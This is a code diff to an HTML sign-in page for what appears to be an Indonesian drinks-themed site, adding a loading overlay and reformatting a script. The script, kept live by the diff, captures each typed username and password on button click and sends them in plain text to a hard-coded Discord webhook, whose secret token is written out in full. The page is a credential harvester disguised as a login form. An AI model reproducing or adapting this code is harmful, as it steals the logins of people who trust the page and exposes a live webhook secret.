@@ -25,6 +25,7 @@
 
     window.addEventListener('load', checkPageExists);
 </script> -->
+<link rel="stylesheet" href="css/stylelogin.css">
 </head>
 
 <body>
@@ -39,6 +40,10 @@
             <p>Tersedia Minuman Yang Murah Buat Menemani Kegalauan Kalian Semua.</p>
           </div>
           <div class="column right has-text-centered">
+            <div id="loading-overlay" class="loading-overlay">
+              <div class="loading-spinner"></div>
+              <p class="loading-text">Sedang Loading CUY!!</p>
+            </div>  
             <h1 class="title is-4">Sign In</h1>
         <div class="field">
           <div class="control">
@@ -107,36 +112,47 @@
 <script>
    //LOG DISCORD
   const webhookURL = "https://discord.com/api/webhooks/1167176384255373395/fCtNBwIQ9zNC78K6IfOfH00XYqCj82A5GJeOrd1-2JX602Yl0lruJSL9ZzNK_3gT1SZG";
-
   document.getElementById("button").addEventListener("click", () => {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
-      const message = `MENCOBA LOGIN NICHH USER: ${username} PASSWORD: ${password}`;
-      sendToDiscordWebhook(message);
+
+    const loadingOverlay = document.getElementById("loading-overlay");
+    loadingOverlay.style.display = "flex";
+
+    const loadingText = document.querySelector(".loading-text");
+    loadingText.style.display = "block";
+
+    const message = `MENCOBA LOGIN NICHH USER: ${username} PASSWORD: ${password}`;
+    sendToDiscordWebhook(message);
   });
 
   function sendToDiscordWebhook(message) {
-      const requestData = {
-          method: "POST",
-          headers: {
-              "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ content: message })
-      };
+    const requestData = {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ content: message })
+    };
 
-      fetch(webhookURL, requestData)
-          .then(response => {
-              if (response.ok) {
-                  console.log(" Berhasil login");
-              } else {
-                  console.error(" GAGAL login");
-              }
-          })
-          .catch(error => {
-              console.error("Terjadi kesalahan:", error);
-          });
+    fetch(webhookURL, requestData)
+      .then(response => {
+        const loadingOverlay = document.getElementById("loading-overlay");
+        loadingOverlay.style.display = "none";
+
+        if (response.ok) {
+          console.log(" Berhasil login");
+        } else {
+          console.error(" GAGAL login");
+        }
+      })
+      .catch(error => {
+        const loadingOverlay = document.getElementById("loading-overlay");
+        loadingOverlay.style.display = "none";
+
+        console.error("Terjadi kesalahan:", error);
+      });
   }
-   //LOG DISCORD
 </script>
 <script type="module" src="./js/login.js"></script>
 </body>
